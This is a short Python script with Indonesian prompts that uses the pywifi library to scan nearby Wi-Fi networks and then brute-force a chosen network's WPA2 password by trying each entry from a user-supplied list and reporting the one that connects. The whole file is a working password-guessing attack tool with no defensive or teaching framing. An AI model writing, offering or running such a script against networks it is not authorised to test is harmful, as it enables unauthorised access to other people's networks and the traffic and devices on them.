import pywifi
from pywifi import const
import time

def scan_wifi():
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    iface.scan()
    time.sleep(2)
    results = iface.scan_results()
    for result in results:
        print(result.ssid)

def brute_force(ssid, password):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password
    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)
    iface.connect(tmp_profile)
    time.sleep(2)
    if iface.status() == const.IFACE_CONNECTED:
        print(f"Password ditemukan: {password}")
        return True
    else:
        return False

ssid = input("Masukkan SSID: ")
password_list = input("Masukkan list password (pisahkan dengan koma): ").split(',')
for password in password_list:
    if brute_force(ssid, password):
        break
